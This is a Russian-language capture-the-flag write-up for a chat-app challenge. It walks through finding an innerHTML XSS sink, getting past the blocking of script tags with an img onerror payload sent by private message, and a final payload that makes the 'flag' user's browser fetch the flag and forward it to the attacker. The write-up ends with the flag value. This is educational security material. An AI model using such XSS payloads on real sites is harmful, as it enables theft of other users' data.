# Secure chat: Write-up

Давайте зайдём в чат с именем _user_ и посмотрим, что там есть.
> Привет и добро пожаловать в наш чат, user! Напиши /help для справки.

Хорошо, посмотрим.
> Доступные команды:
> - /help — эта справка
> - /pm \[user] \[message] — отправить личное сообщение \[message] пользователю \[user]
> - /flag — получить флаг (доступно только пользователю flag)
> - /users — получить список подключенных к серверу

Так, флаг доступен только пользователю _flag_. Попытаемся войти.
> Имя пользователя занято.

Ладно, не всё так уж просто. Давайте подумаем, как же можно "обмануть" сервер? Для начала, изучим 
исходник сайта. Нас интересует скрипт. Где-то в коде есть такая функция:
```javascript
function insertMessage(text) {
    const message = document.createElement('p');
    message.className = 'message';
    message.innerHTML = text;
    document.getElementById('messages').insertAdjacentElement('afterbegin', message);
}
```
Обратим внимание на эту строчку:
> `message.innerHTML = text`

М-да. Ну и безопасность. На лицо явный [XSS][xss]. Так давайте же попробуем эксплуатировать!
Пишем `<script>alert();</script>`, отправляем и... Получаем такое сообщение:
> Для предотвращения флуда, форматирование текста в общем чате запрещено.

Интересненько. Давайте вернёмся к справке и ещё раз перечитаем внимательно. У нас есть команда 
`/pm`, чтобы отправлять личные сообщения. Самое время попробовать отправить себе сообщение с 
"форматированием". Сначала откроем ещё одну вкладку и зайдём с именем _user2_, а затем от имени
_user_ отправим: `/pm user2 <script>alert();</script>`. Упс, ничего не произошло. Но почему?! 
Немного [погуглив][lmgtfy], узнаём, что [`innerHTML`][innerhtml] не даст динамически вставить тег 
`<script>`. Но у нас есть и другие варианты. Например, `<img src='' onerror='alert();'>`. Пишем, 
отправляем. Ух ты, заработало! Самое время продолжить изучать код и написать эксплоит, который 
при помощи команды `/pm` отправит нам флаг: 
```
/pm flag <img src='' onerror="ws.onmessage=function(e){setTimeout(function(){sendMessage('/pm user '+e.data);ws.onmessage=function(e){insertMessage(e.data);};},1500);};setTimeout(function(){sendMessage('/flag');},1500);">
```

Флаг: `ytctf{This_should_not_happen_but_I_can_do_XSS_via_w3bs0ket_haha}`

[xss]: https://ru.wikipedia.org/wiki/%D0%9C%D0%B5%D0%B6%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%B2%D1%8B%D0%B9_%D1%81%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D0%B8%D0%BD%D0%B3
[lmgtfy]: https://www.google.com/search?q=insert+script+tag+dynamically
[innerhtml]: https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML
